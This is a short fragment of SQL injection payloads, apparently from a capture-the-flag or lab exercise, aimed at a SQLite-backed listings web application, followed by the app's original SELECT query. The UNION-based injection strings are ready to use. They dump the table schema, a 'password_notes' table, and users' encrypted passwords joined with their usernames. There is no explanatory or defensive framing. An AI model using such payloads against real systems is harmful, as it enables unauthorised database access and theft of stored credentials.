```text
' AND 1=0) UNION ALL SELECT 0,name,sql,0,'','','' FROM sqlite_master WHERE type='table' -- x
' AND 1=0) UNION ALL SELECT phase,key_piece,CAST(phase AS TEXT),0,'','','' FROM password_notes -- x
' AND 1=0) UNION ALL SELECT password_vault.user_id,users.username,password_vault.encrypted_password,0,'','','' FROM password_vault JOIN users ON users.id=password_vault.user_id -- x
```
 "SELECT l.id,l.title,l.description,l.price_cents,l.image_filename,u.username owner,'' created_at FROM listings l JOIN users u ON u.id=l.owner_id"

 